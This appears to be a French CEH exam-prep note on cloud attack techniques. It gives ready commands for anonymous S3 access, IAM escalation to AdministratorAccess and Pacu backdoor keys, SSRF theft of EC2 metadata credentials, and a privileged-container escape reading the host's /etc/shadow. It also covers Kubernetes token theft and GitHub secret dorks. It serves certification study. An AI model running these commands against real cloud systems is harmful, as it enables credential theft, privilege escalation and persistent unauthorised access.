# 🔴 Module 19 — Techniques d'Attaques Cloud

> **CEH v13 | EC-Council**  
> `#S3Enum` `#IAMEscalation` `#ContainerEscape` `#Kubernetes` `#Serverless`

---

## 📌 Table des matières

1. [Enumération S3 — Buckets Mal Configurés](#1-enumération-s3--buckets-mal-configurés)
2. [Exploitation IAM](#2-exploitation-iam)
3. [SSRF → Metadata Service](#3-ssrf--metadata-service)
4. [Container Escape et Kubernetes](#4-container-escape-et-kubernetes)
5. [Secrets dans le Code Source (GitHub)](#5-secrets-dans-le-code-source-github)

---

## 1. Enumération S3 — Buckets Mal Configurés

```bash
# Tenter l'accès anonyme à un bucket :
aws s3 ls s3://company-backup --no-sign-request
aws s3 cp s3://company-backup/passwords.txt . --no-sign-request

# Enumérer les buckets publics (outils) :
# S3Scanner :
python3 s3scanner.py --bucket company --include-closed

# GrayhatWarfare (online) :
# https://buckets.grayhatwarfare.com → chercher le domaine de l'entreprise

# Techniques de naming guessing :
# company-prod-backup
# company.com-logs
# company-dev-db
# Tester les variations : company-staging, company-assets, company-data...

# Bucket policy misconfiguration :
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket
```

---

## 2. Exploitation IAM

```bash
# Enumérer les droits de son propre utilisateur :
aws sts get-caller-identity                          # Qui suis-je ?
aws iam list-attached-user-policies --user-name me  # Mes policies attachées
aws iam list-user-policies --user-name me           # Inline policies
aws iam get-policy-version --policy-arn arn: --version-id v1

# Vérifier ce que je peux faire :
# Cloudsplaining : analyser les policies IAM pour trouver les permissions excessives
cloudsplaining scan --input-file account-authorization-details.json

# Privilege Escalation via IAM :
# Si on a iam:AttachRolePolicy → Ajouter AdministratorAccess à notre rôle !
aws iam attach-role-policy --role-name TargetRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Pacu (framework d'exploitation AWS) :
run iam__privesc_scan         # Scanner toutes les possibilités d'escalade
run iam__backdoor_users_keys  # Créer des backdoors IAM persistantes
```

> 💡 **Question type exam** : *Si un attaquant a la permission `iam:AttachRolePolicy`, quelle action peut-il effectuer ?* → S'accorder des droits **AdministratorAccess** = escalade de privilèges totale.

---

## 3. SSRF → Metadata Service

```bash
# Exploitation via application vulnérable au SSRF :
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Obtenir le nom du rôle IAM associé à l'instance :
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Réponse : "my-ec2-role"

# Obtenir les credentials temporaires :
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role"
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "xxx",
#   "Token": "yyy"
# }

# Utiliser ces credentials pour pivoter :
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="xxx"
export AWS_SESSION_TOKEN="yyy"
aws s3 ls                         # Lister les buckets accessibles avec ce rôle
aws ec2 describe-instances        # Voir toutes les instances
```

---

## 4. Container Escape et Kubernetes

```bash
# Container misconfiguration — privileged container :
# Un conteneur "privileged" a accès à TOUS les devices du host !
docker run --privileged malicious-image

# Dans le conteneur privileged :
# Monter le filesystem du host :
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow     # Lire les mots de passe du host !
chroot /mnt/host /bin/bash   # Shell complet sur le host !

# Kubernetes — API Server exposé sans authentification :
kubectl --server=http://k8s-api:8080 get pods
kubectl --server=http://k8s-api:8080 get secrets --all-namespaces
kubectl --server=http://k8s-api:8080 exec -it pod-name -- /bin/bash

# Accès au service account token depuis l'intérieur d'un pod :
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Utiliser ce token pour accéder à l'API K8s avec les droits du serviceaccount
```

---

## 5. Secrets dans le Code Source (GitHub)

```bash
# TruffleHog — scanner les secrets dans git (historique inclus) :
trufflehog git https://github.com/target/repo
trufflehog git file:///path/to/local/repo --only-verified

# GitLeaks :
gitleaks detect --source=/path/to/repo --verbose

# Patterns recherchés automatiquement :
# AKIA = AWS Access Key ID (commence toujours par AKIA ou ASIA)
# AWS_SECRET_ACCESS_KEY
# password, secret, api_key, private_key
# -----BEGIN RSA PRIVATE KEY-----
# Bearer tokens, JWT

# GitHub Search Dorks (recherche directe sur GitHub) :
# org:TargetCompany AKIA
# org:TargetCompany "aws_secret_access_key"
# org:TargetCompany filename:.env
# org:TargetCompany filename:terraform.tfstate
```

---

## 🧠 Points clés à retenir pour l'examen

- **S3 misconfiguration** = `aws s3 ls --no-sign-request` pour tester l'accès public anonyme
- **SSRF → 169.254.169.254** = obtenir les credentials IAM temporaires de l'instance EC2
- **IMDSv2** = protection SSRF (token PUT requis avant GET des metadata)
- **IAM privilege escalation** = `iam:AttachRolePolicy` → s'ajouter AdministratorAccess
- **Privileged container** = peut monter et accéder au filesystem complet du host
- **TruffleHog/GitLeaks** = scanner les secrets dans les repos Git (historique inclus)

---

*⬅️ [Menaces Cloud](./02_menaces_cloud.md) | ➡️ [Outils et Labs](./04_outils_et_labs.md)*
